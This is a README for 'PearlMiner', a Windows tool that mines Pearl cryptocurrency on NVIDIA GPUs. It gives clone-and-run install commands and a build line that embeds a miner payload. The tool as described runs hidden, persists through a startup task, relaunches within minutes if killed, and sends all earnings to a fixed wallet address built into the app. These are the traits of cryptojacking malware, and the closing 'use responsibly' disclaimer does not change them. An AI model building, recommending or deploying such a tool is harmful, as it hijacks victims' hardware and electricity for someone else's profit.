# PearlMiner

Single-file Windows app that mines **Pearl (PRL)** via **SRBMiner-MULTI** on any NVIDIA GPU
(PearlHash, 2Miners pool `prl.2miners.com:1818`) and pays the fixed wallet address
embedded in the app. Runs hidden at all times; only visible as processes in Task Manager.

## Install (clone and run)

```
git clone https://github.com/mrmackkm223-coder/miner.git
.\PearlMiner\PearlMiner.exe
```

Opening the exe once is the whole install: it auto-downloads the official SRBMiner-MULTI
release from GitHub if needed, preflight-checks the GPU and miner, registers the
current-user startup task (`PearlMinerTask`), and starts hidden mining immediately.

Or one-time setup then scriptable control:

```
PearlMiner.exe --enable     # enable persistent hidden mining
PearlMiner.exe --disable    # stop mining, kill processes, remove the task
PearlMiner.exe --status     # task / supervisor / miner state
```

## Behavior

- Starts automatically at every sign-in; relaunches within ~5 minutes if killed.
- No window at any time. Logs: `%LOCALAPPDATA%\PearlMiner\srbminer.log` (hashrate,
  shares) and `supervisor.log`. Settings: `%LOCALAPPDATA%\PearlMiner\settings.json`.
- Per-user only: it persists on the account that ran it, not other accounts.
- Stops only via **Disable persistent mode** or `--disable` (removes the task).
- Fixed payout: `prl1pj5pjxvpextezdndr0qchfdt8sy0znq0vjq9tpqng3r920pvn08xqdgwd27`
  (all earnings go to this address — verify it is yours before running).

## Build

Requires nothing but Windows (uses the built-in .NET Framework compiler):

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -nologo -target:winexe ^
  -resource:srb_payload.txt,PearlMiner.srb_payload.txt -out:PearlMiner.exe -platform:anycpu -optimize+ ^
  -r:System.Windows.Forms.dll -r:System.Drawing.dll ^
  -r:System.IO.Compression.dll -r:System.IO.Compression.FileSystem.dll Program.cs
```

## Use responsibly

Run only on machines you own or whose owner has agreed. This software deliberately
does not hide from Task Manager, Task Scheduler, or antivirus, and does not persist
across other user accounts.
